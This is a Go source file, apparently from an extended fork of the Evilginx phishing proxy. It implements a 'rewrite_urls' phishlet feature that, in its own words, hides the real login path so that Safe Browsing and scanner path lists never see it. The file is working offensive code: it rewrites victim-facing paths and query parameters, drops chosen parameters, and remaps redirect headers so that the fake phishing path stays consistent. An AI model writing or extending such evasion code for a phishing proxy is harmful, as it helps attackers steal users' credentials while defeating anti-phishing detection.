package core

// rewrite.go — evilginx2-extended: rewrite_urls phishlet feature.
// Parity with Evilginx Pro "Anti-phishing Evasion (Rewrite URLs)": the
// victim-facing URL path differs from the real origin path, so URL-based
// detection (Safe Browsing, scanner path lists) never sees the real one.
//   phishlet:
//     rewrite_urls:
//       - {from: '^/secure-verify$', to: '/login'}
// Incoming: victim path matching `from` is rewritten to `to` before
// proxying upstream. Outgoing: Location headers and the lure->login
// redirect have `to` mapped back to `from` so the fake path is consistent.

import (
	"net/url"
	"regexp"
	"strings"
)

type RewriteUrl struct {
	from     *regexp.Regexp
	to       string
	plain    string            // `from` without regex anchors, for output-side URL mapping
	queryMap map[string]string // victim param -> origin param
	drop     []string          // victim params never forwarded to origin
}

type ConfigRewriteUrl struct {
	From     *string            `mapstructure:"from"`
	To       *string            `mapstructure:"to"`
	QueryMap map[string]string  `mapstructure:"query_map"`
	Drop     []string           `mapstructure:"drop"`
}

func (p *Phishlet) addRewriteUrl(from string, to string, queryMap map[string]string, drop []string) error {
	re, err := regexp.Compile(from)
	if err != nil {
		return err
	}
	plain := strings.TrimSuffix(strings.TrimPrefix(from, "^"), "$")
	p.rewriteUrls = append(p.rewriteUrls, &RewriteUrl{from: re, to: to, plain: plain, queryMap: queryMap, drop: drop})
	return nil
}

// rewritePathInEx maps a victim-facing URL path to the real origin path and
// returns the rule that matched (nil when no rule), so query rewriting can
// use the same rule.
func (p *Phishlet) rewritePathInEx(path string) (*RewriteUrl, string) {
	for _, ru := range p.rewriteUrls {
		if ru.from.MatchString(path) {
			return ru, ru.from.ReplaceAllString(path, ru.to)
		}
	}
	return nil, path
}

// rewritePathIn maps a victim-facing URL path to the real origin path.
func (p *Phishlet) rewritePathIn(path string) string {
	_, np := p.rewritePathInEx(path)
	return np
}

// RewriteQueryIn renames victim params to origin names and drops blacklisted
// ones. Unmapped params pass through untouched.
func (ru *RewriteUrl) RewriteQueryIn(rawQuery string) string {
	if len(ru.queryMap) == 0 && len(ru.drop) == 0 {
		return rawQuery
	}
	vals, err := url.ParseQuery(rawQuery)
	if err != nil {
		return rawQuery
	}
	out := url.Values{}
	for k, vs := range vals {
		if stringExists(k, ru.drop) {
			continue
		}
		nk := k
		if m, ok := ru.queryMap[k]; ok {
			nk = m
		}
		for _, v := range vs {
			out.Add(nk, v)
		}
	}
	return out.Encode()
}

// RewriteQueryOut reverses the param mapping for URLs sent back to the
// victim (Location headers): origin names become victim names.
func (ru *RewriteUrl) RewriteQueryOut(rawQuery string) string {
	if len(ru.queryMap) == 0 {
		return rawQuery
	}
	vals, err := url.ParseQuery(rawQuery)
	if err != nil {
		return rawQuery
	}
	out := url.Values{}
	for k, vs := range vals {
		nk := k
		for vk, ov := range ru.queryMap {
			if ov == k {
				nk = vk
				break
			}
		}
		for _, v := range vs {
			out.Add(nk, v)
		}
	}
	return out.Encode()
}

// rewriteUrlOut maps origin paths (and query params) back to victim-facing
// names. `u` may be absolute or relative; `to` is matched as a path segment
// (suffix, or followed by `?` or `/`) to avoid rewriting unrelated substrings.
func (p *Phishlet) rewriteUrlOut(u string) string {
	for _, ru := range p.rewriteUrls {
		if strings.HasSuffix(u, ru.to) ||
			strings.Contains(u, ru.to+"?") ||
			strings.Contains(u, ru.to+"/") {
			u = strings.Replace(u, ru.to, ru.plain, 1)
			if i := strings.Index(u, "?"); i >= 0 {
				u = u[:i+1] + ru.RewriteQueryOut(u[i+1:])
			}
			return u
		}
	}
	return u
}
